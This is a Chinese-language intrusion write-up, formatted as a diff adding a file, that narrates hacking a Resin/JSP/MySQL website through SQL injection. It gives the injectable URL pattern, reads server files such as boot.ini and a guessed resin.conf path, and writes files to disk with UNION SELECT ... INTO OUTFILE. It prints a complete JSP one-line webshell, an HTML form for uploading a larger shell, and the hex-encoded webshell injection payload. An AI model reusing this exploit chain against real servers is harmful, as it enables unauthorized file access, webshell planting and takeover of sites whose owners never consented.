@@ -1,0 +1,139 @@
+对Resin服务器的一次渗透　
+
+
+
+采集信息:
+
+Resin-3.0.14/JSP/MySQL建构
+
+入侵思路:
+
+得到注入点与WEB根目录，导出SHELL
+
+实例经过:
+
+顺利得到注入点:
+
+http://www.abc.com/news.jsp?id=2
+
+得到mysql版本为4.0以上，可由于种种原因，不能union进行load_file，于是就用mysqlget，得到c:/boot.ini内容如下:
+
+__________________________________________________________
+
+[boot loader]
+
+timeout=30
+
+default=multi(0)disk(0)rdisk(0)partition(1)\WINNT
+
+[operating systems]
+
+multi(0)disk(0)rdisk(0)partition(1)\WINNT="Microsoft Windows 2000 Server" /fastdetect
+
+__________________________________________________________
+
+虽然对入侵来说，没多大用，可至少证明了可以读服务器上的文件，就可以通过读Resin服务器的配置文件来获得web根目录的绝对路径了
+
+由于无法暴出web根目录，无奈用出最后一招，猜路径，所以在网上搜集关于Resin服务器的信息，
+
+通过在网上搜集的关于Resin服务器的文章，可能性最大的猜解Resin服务器配置文件路径如下：
+
+c:/Resin-3.0.14/conf/resin.conf
+
+d:/Resin-3.0.14/conf/resin.conf
+
+e:/Resin-3.0.14/conf/resin.conf
+
+f:/Resin-3.0.14/conf/resin.conf
+
+c:/Resin/conf/resin.conf
+
+d:/Resin/conf/resin.conf
+
+e:/Resin/conf/resin.conf
+
+f:/Resin/conf/resin.conf
+
+人品好就是没办法，猜出路径如下:
+
+e:/Resin/conf/resin.conf
+
+开始用mysqlget读取文件内容，得到文件长度为8469字节，一个字节一个字节的猜太慢了，
+
+就从网上找了个Resin的配置文件，估计一下，WEB目录的信息应该在最后1000个字节，通过
+
+读取进行对比最终得到配置信息如下:
+
+__________________________________________________________
+
+<host id="" root-direectory=".">
+
+<!--
+
+- configures an explicit root web-app matching the
+
+- webapp's ROOT
+
+-->
+
+<web-app id="/" document-directory="webapps/zhaotiie/domain"/>
+
+</host>
+
+<host host-name="www.abc.com">
+
+<web-app id="/" document-directory="webapps/zhaotie"/>
+
+</host>
+
+<host host-name="www2.abc.com">
+
+<web-app id="/" document-directory="webapps/zhaotie"/>
+
+</host>
+
+</server>
+
+</resin>
+
+__________________________________________________________
+
+好了，关键一步又解决了，得到WEB目录绝对路径为"e:/Resin/webapps/zhaotie/"
+
+接下来，写SHELL了，注入点太难利用,虽然UNION出错，可我知道仍然能够导出SHELL
+
+先测试下：
+
+http://www.abc.com/news.jsp?id=2 and 1=2 union select 31,30,29,28,27,26,25,24,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1 into outfile 'e:/Resin/webapps/zhaotie/images/a.txt'/*
+
+顺利得到http://www.abc.com/images/a.txt
+
+接下来写入JSP一句话木马如下：
+
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+
+功能是把提交t的内容写到WEB根目录的f文件里
+
+假如木马为http://www.abc.com/images/c.jsp接下来可以通过
+
+<form method=post action=http://www.abc.com/images/c.jsp>
+
+<input type=input value="x.jsp" name=f>
+
+<textarea name=t cols=50 rows=20></textarea>
+
+<input type=submit>
+
+</form>
+
+得到一个大马http://www.abc.com/x.jsp
+
+好了，动工，把一句话木马进行16进制编码后提交，得到SHELL如下：
+
+http://www.abc.com/news.jsp?id=2 and 1=2 union select 0x3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E,30,29,28,27,26,25,24,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1 into outfile 'e:/Resin/webapps/zhaotie/images/c.jsp'/*
+
+成功得到SEHLL http://www.abc.com/images/c.jsp
+
+二话不说，上传大马，给管理员留言，删除SHELL..................
+
+此次入侵宣告结束，有句话说的好，适可而止
